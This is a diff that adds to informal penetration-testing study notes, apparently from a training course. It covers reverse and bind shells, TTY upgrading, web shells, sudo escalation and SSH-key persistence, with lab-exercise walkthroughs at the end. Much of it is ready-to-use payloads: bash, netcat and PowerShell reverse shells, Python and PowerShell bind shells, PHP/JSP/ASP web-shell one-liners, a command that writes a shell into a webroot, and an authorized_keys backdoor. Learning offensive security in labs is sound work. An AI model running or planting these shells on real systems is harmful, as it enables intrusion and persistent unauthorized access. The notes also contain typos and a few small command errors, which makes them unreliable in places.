@@ -410,7 +410,76 @@ EX: get a reverse conn for bash on Linux compromised hosts and Powershell on win
 $bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 -Powershell
-$powershell -nop -c "$client = New -O
+$powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+execute above scipt through python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our netcat listener
+$nc -lvnp 1234
+after we received a conn on our netcat listener, we were able to type our command and direct get its output back 
+-A reverse shell is handy when we want to get a quick, reliable conn to our compromissed host.
+however a reverse shell can be very fragile. once the reverse shell command is stopped, or if we lose our conn for any reason, we would have to use the initial exploit to exe the reverse shell comand again to regain our access
+\\Bind shell
+unlike reverse shell that conn to us, we will have to conn to it on the targets' listening port
+-once it execute it will start listerning on a port on the remote host and bind that host's shell ie Bash or Powershell to that port
+- we have to connect to that port with netcat, and we will get control through a shell
+\\Bind Shell Command
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#python
+NOTE: we will start a listerning conn on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere
+-The following are reliable commands we can use to start a bind shell:
+$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+Python$python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+Powershell$powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+\\Netcat connection
+once execute the bind shell command, we should have a shell waiting for us on the specified port. we can connect to it
+we can use netcat to connect to that port and get a connection to the shell:
+$nc 10.10.10.1 1234
+-> we direct dropped into a bash, unlike reverse shell if conn drop we can conn back to it and get another conn immediately.
+anyway when the remote host is rebooted we will lose our access to it 
+\\Upgrading TTY
+once we connect to a shell through Netcat, we will notices that we only type command or backspace, cannot move text cursor
+we need to upgrade our TTY this canbe achived by mapping our terminal TTY with the remote TTY
+-there some method to upgrade TTY like python/stty method.
+$python -c 'import pty; pty.spawn("/bin/bash")'
+-> ctrl + z to background our shell and get back on our local terminal and input stty command
+$^Z    ->   $stty raw -echo    -> $fg 
+once we hit fg, it will bring back our netcat shell to the foreground, at this point, the terminal will show a a blank line
+-modify terminal by 
+$echo $Terminal
+$stty sizeable
+the first command showed us the TERM variable, and the second shows us the values for rows and columns respectively. now that we have our variable, 
+$export TERM=xterm-256color
+$stty rows 67 columns 318
+now we have a netcat shell with full feature like SSH conn
+\\Web Shell
+it typically a web script, i.e PHP or ASPX, that accepts our command through HTTP request parameters such as GET or post
+request parameters, executes our command, and prints its output back on the webpage
+\\Writting a web shell
+we write our web shell that would take our command through a GET request, execute it, and print its output back, A web shell script is typically a one-liner that is very short and can be memorized easily 
+php$<?php system($_REQUEST["cmd"]); ?>
+JSP$<% Runtime.getRuntime().exec(request.getParameter("cmd)); %>
+asp$<% eval request("cmd") %>
+\\Uploading a Web shell
+execute the cript through the web server. this can be through a vul in an upload feature, which would allow us to write one of our shells to a file,
+i.e shell.php and upload it, and then access our uploaded file to execute commands
+-hwer if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web
+. so the first step is to identify where the webroot is. the following are the default webroots for common web server
+Web server              Default webroot
+Apache                  /var/www/html/
+Nginx                   /usr/local/nginx/html
+IIS                     c:\inetpub\wwwroot\
+XAMPP              c:\xampp\htdocs\
+we can check these dir to see which webroot is inuse and then use echo to write out our web shell
+EX: if we atking a Linux host running Apache, we can write a PHP shell
+bash$ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+\\Accessing Web Shell
+once we write our web shell, we can either access it through a browser or by using cURL, we can visit the shell.php page
+on the compromised website, and use ?cmd=id to execute the id command"
+http://SERVER_IP:PORT/shell.php?cmd=id
+-another options is to use cURL
+$curl http://SERVER_IP:PORT/shell.php?cmd=id
+now changin command to get its output. web shell will bypass any firewall restricted in place, as it will not open a new conn
+on a port but run on the web port on 80 or 443, or whatever port the web app is using.
+-if a comprimissed hos tis reboot the web shell still in place
+webshell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our command
+in extrem cases, it is possible to code a python script to automate this process and give us a semi-interactive web shell right within out terminal
 
 
 \\\\Privileged escalation
@@ -441,7 +510,8 @@ searchsploit for exploiting identified
 -The sudo command in Linux allows a user to execute commands as a diff user. it is usually used to allow lower privileged users to execute commands
 as root without giving them access to the root user.
 -this is generally done as specific commands can only be run as root like $tcpdump or allow the user to access certain root-only dir. we can check what sudo privileges we have
-$sudo -l  -> $sudo su -l -> check for password properties -> $sudo -u user /bin/echo hello world
+$sudo -l  -> $sudo su -l -> check for password properties 
+-> $sudo -u user /bin/echo hello world
 - once we find a specific app run with sudo, we can look for ways to exploit itto get a shell as the root user.
 -GTFOBins https://gtfobins.github.io/ contains a list of commands and how they can be exploited through sudo, search for app we have sudo privileged over.
 -> it may tell us the exact command we should execute to gain root access using the sudo privileges we have
@@ -470,3 +540,30 @@ look fr any exposed credentials. thiss is very common with configuration files, 
 $vim id_rsa
 $chmod 600 id_rsa
 $ssh root@10.10.10.10 -i id_rsa
+Note that use command 'chmod 600 id_rsa' on the key after we created it on our machine to change the files perm tobe more restrictive/
+<>if ssh keys have lax perm ie maybe read by other people, the ssh server would prevent them from working
+<>if we find ourselves with write access to a users /.ssh/ dir, we can place our public key in the user's ssh dir at /home/user/.ssh/authorized_keys. this technique is usually used to gain ssh access after gaining a shell as that user
+-the current SSH configuration will not accept keys written by other users, so it will only work if wehave gained over by that user
+<1> create a new key with ssh-keygen and the -f flag to specify the output file:
+$ssh-keygen -f key
+-> this then gen 2 key which will use with ssh -i and key.pub, which we will copy to the remote machine
+->copy key.pub then on the remote machine add it to /root/.ssh/authorized_keys:
+echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+-the remote server should allow us to log in as that user by using our private key:
+$ssh root@10.10.10.10 -i key
+<test>  SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
+-> $ssh username@ip -p <port> -> -> sudo -l  -> ##sudo su -
+->sudo -u user2 /bin/bash -> sudo -u user2 /bin/bash -> whoami
+cat ~/flag/txt
+<test>Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
+$ls -lA / (need to know that they can access the root directory because it is misconfigured, given that the group to which it belongs to is user2)
+-> cd /root -> ls -lA (After changing directories into the /root directory, students will notice that the .ssh/ directory, similar to the root directory, is also misconfigured:)
+-> cd .ssh/ -> ls -lA
+-need to abuse this misconfiguration by using SSH to login as the root user.
+-need to know the active connections on the spawned target machine, and what ports they are listening on by using netstat, finding port 80 listening for connections:
+-> $netstat -antpl
+-Before attempting to connect to port 80, students can grab the banner of the service running using nc, finding it to be SSH (students can use Ctrl + c to exit from the connection):
+-> $nc localhost 80 -> ssh as the root user via port 80
+-> ssh -i id_rsa root@localhost -p 80  -> Y ->cat flag.txt
+
+
